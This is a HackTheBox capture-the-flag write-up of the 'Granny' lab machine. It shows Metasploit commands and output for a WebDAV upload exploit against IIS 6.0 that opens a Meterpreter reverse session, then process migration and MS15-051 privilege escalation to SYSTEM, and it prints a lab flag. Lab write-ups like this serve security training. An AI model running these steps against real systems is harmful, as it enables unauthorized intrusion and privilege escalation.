+++
title = "HackTheBox - Granny Writeup"
date = "2026-04-12"
description = "IIS 6.0 WebDAV upload vulnerability + MS15-051 privilege escalation"
tags = ["HackTheBox", "CTF", "Windows", "WebDAV", "IIS", "Metasploit", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Granny |
| OS | Windows Server 2003 SP2 |
| Difficulty | Easy |
| IP | 10.129.17.237 |


---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC 10.129.17.237
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan:
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

---

## Initial Access — WebDAV Upload

```bash
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS 10.129.17.237
set LHOST 10.10.16.166
set LPORT 4444
run
```

```text
[*] Checking /metasploit259717931.asp
[*] Uploading 52825 bytes to /metasploit259717931.txt...
[*] Moving /metasploit259717931.txt to /metasploit259717931.asp...
[*] Executing /metasploit259717931.asp...
[*] Deleting /metasploit259717931.asp (this doesn't always work)...
[*] Sending stage (196678 bytes) to 10.129.17.237
[!] Deletion failed on /metasploit259717931.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.16.166:4444 -> 10.129.17.237:1030)
```

---

## Foothold

```bash
getuid
```

```text
NT AUTHORITY\NETWORK SERVICE
```

---

## System Info

```bash
sysinfo
```

```text
Computer        : GRANNY
OS              : Windows Server 2003 (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

---

## Post Exploitation — Process Migration

```bash
ps
migrate 2240
```

```text
[*] Migrating from 1932 to 2240...
[*] Migration completed successfully.
```

---

## local_exploit_suggester

```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION 3
run
```

```text
[+] exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

---

## Privilege Escalation — MS15-051

```bash
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 3
set LHOST 10.10.16.166
set LPORT 5555
run
```

```text
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 4068 launched.
[*] Reflectively injecting the DLL into 4068...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (196678 bytes) to 10.129.17.237
[*] Meterpreter session 5 opened (10.10.16.166:5555 -> 10.129.17.237:1035)
```

---

## Flags

### User

```bash
type "C:\Documents and Settings\Lakis\Desktop\user.txt"
```

```text
700c5dc163014e22b3e408f8703f67d1
```

### Root

```bash
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

---

## Summary

WebDAV Upload (iis_webdav_upload_asp) → NETWORK SERVICE → migrate davcdata.exe → MS15-051 → SYSTEM
